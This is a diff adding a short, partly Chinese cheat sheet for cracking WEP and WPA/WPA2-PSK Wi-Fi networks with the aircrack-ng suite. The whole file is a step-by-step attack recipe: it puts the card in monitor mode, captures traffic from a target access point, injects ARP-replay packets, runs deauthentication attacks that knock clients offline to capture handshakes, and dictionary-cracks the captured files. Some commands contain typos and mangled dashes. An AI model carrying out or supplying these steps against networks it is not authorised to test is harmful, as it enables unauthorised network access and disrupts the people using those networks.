@@ -1,0 +1,29 @@
+#aricrack-ng cracking WEP wifi network
+1.load the wireless card
+ifconfig
+ifconfig wlan0 up
+iwconfig
+2.start monitoring mode on wireless card
+airmon-ng start wlan0
+3.catch packages
+airodump-ng mon0
+then
+airodump-ng --ivs –w FILE -c 6 mon0
+airodump-ng –w FILE -c 6 wlan0 
+4.attack target AP with ArpRequest
+aireplay-ng -3 -b AP_mac -h host_mac mon0 
+5.cracking
+aircrack-ng ivs_files|cap_files
+
+#WPA-PSK
+1.airodump-ng-oui-update 
+2.active card to monitoring mode
+3.catch packages 
+airodump-ng -c 6 –w longas mon0 
+步骤4：进行Deauth攻击加速破解过程。
+aireplay-ng -0 n –a AP的mac -c 客户端的mac wlan0 
+步骤5：开始破解WPA-PSK。
+aircrack-ng -w dic 捕获的cap文件 
+
+#使用Aircrack-ng破解WPA2-PSK加密无线网络
+as WPA-PSK
